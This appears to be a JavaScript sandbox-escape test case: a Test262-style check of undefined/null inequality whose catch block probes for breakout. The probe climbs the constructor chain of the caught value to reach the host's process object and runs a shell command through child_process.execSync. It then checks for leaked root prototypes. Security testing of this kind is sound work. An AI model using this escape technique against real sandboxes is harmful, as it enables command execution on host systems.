try {
    if (undefined != undefined !== false) {
        $ERROR('#1: (undefined != undefined) === false');
    }
    if (void 0 != undefined !== false) {
        $ERROR('#2: (void 0 != undefined) === false');
    }
    if (undefined != eval('var x') !== false) {
        $ERROR('#3: (undefined != eval("var x")) === false');
    }
    if (undefined != null !== false) {
        $ERROR('#4: (undefined != null) === false');
    }
    if (null != void 0 !== false) {
        $ERROR('#5: (null != void 0) === false');
    }
    if (null != null !== false) {
        $ERROR('#6: (null != null) === false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}